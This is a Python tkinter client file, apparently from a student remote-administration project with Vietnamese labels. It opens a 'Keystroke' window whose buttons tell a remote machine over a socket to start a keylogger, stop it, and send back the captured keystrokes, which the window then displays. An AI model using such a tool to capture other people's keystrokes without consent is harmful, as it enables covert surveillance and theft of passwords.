import tkinter as tk
from client import *
from connect_server import *

data = None

def hook(window):
    message = "keys"
    globals.client_socket.send(message.encode())


def unhook(window):
    message = "stop_keylog"
    globals.client_socket.send(message.encode())

def in_phim(window):
    message = "in"
    globals.client_socket.send(message.encode())
    data = globals.client_socket.recv(1024)
    window.txtKQ.config(state="normal")
    message = data.decode()
    window.txtKQ.insert(tk.END, message)
    window.txtKQ.config(state="disabled")
    

def xoa(window):
    window.txtKQ.config(state="normal")
    window.txtKQ.delete(1.0, tk.END)
    window.txtKQ.config(state="disabled")

def on_closing(window):
    #Implement on_closing logic
    pass



def open_keylog_window(self):
    window = tk.Toplevel(self)

    window.title("Keystroke")
    window.geometry("347x271")

    window.txtKQ = tk.Text(window, state="disabled") # cái state này là để cái ô text thành read-only
    window.txtKQ.place(x=12, y=77, width=318, height=182)

    window.button1 = tk.Button(window, text="Hook", command=lambda:hook(window))
    window.button1.place(x=12, y=12, width=75, height=59)

    window.button2 = tk.Button(window, text="Unhook", command=lambda:unhook(window))
    window.button2.place(x=93, y=13, width=75, height=58)

    window.button3 = tk.Button(window, text="In phím", command=lambda:in_phim(window))
    window.button3.place(x=174, y=12, width=75, height=59)

    window.butXoa = tk.Button(window, text="Xóa", command=lambda:xoa(window))
    window.butXoa.place(x=256, y=13, width=74, height=58)